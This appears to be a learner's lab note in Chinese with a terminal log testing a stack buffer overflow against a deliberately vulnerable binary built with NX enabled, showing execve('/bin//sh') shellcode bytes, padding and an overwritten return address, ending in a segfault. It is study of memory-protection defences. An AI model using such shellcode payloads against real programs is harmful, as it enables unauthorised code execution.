没有看出有啥区别，代码存在问题。
```
[root@ubuntu0006:~/cmake] #gcc l.c -fno-stack-protector -no-pie -z noexecstack -o nx -m64
[root@ubuntu0006:~/cmake] #./a.out
give me your sheelcode please:
whoami
0x7fff008b3e20[root@ubuntu0python3 k.py
[+] Starting local process './nx': pid 28670
b'1\xc9\xf7\xe1Qh//shh/bin\x89\xe3\xb0\x0b\xcd\x80'
b'1\xc9\xf7\xe1Qh//shh/bin\x89\xe3\xb0\x0b\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0!\xb0\xb8\xfe\x7f\x00\x00'
[*] Switching to interactive mode
[*] Process './nx' stopped with exit code -11 (SIGSEGV) (pid 28670)
give me your sheelcode please:
[*] Got EOF while reading in interactive
$ whoami
[*] Got EOF while sending in interactive
```